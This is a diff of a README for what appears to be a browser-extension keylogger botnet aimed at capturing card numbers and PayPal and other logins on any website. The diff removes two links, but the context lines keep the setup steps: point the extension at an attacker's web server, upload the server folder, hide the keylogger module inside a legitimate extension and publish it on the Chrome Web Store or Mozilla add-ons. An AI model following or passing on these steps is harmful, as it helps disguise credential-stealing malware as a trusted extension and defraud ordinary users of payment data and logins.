@@ -3,7 +3,6 @@ botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,f
 # demo video Youtub 
 https://www.youtube.com/watch?time_continue=10&v=uwRJPDChyrA
 # Help 
-https://panafricaine.com/ransomware/Keylogger/4/comment-les-hackers-piratent-les-cartes-bancaires-facilement-2019.php
 
 ![0](https://user-images.githubusercontent.com/30985149/51928041-e69fd800-23ec-11e9-9c1d-440fb8e025d3.png)
 
@@ -28,7 +27,6 @@ change http://1127.0.0.1     to your web server
 2) send folder named "server"   to your web server , test with wampserver or xhampp
 
 3) take a legitimate extension then add your keylogger module, if you have questions how does it work ask me in comment
-  https://panafricaine.com/ransomware/Keylogger/4/comment-les-hackers-piratent-les-cartes-bancaires-facilement-2019.php
 
 4) publish your extension one chrome web store or adon mozilla
 
